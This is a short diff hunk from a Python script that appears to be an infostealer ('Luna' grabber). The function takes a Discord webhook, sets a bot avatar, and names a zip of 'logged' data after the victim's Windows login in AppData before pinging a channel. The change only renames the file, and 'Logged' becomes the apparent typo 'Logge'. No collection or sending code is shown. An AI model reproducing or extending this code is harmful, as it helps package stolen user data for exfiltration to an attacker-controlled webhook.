@@ -68,7 +68,7 @@ def main(webhook: str):
         "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
     }
 
-    _file = f'{localappdata}\\Luna-Logged-{os.getlogin()}.zip'
+    _file = f'{localappdata}\\Luna-Logge-{os.getlogin()}.zip'
 
     if __CONFIG__["ping"]:
         if __CONFIG__["pingtype"] in ["Everyone", "Here"]:
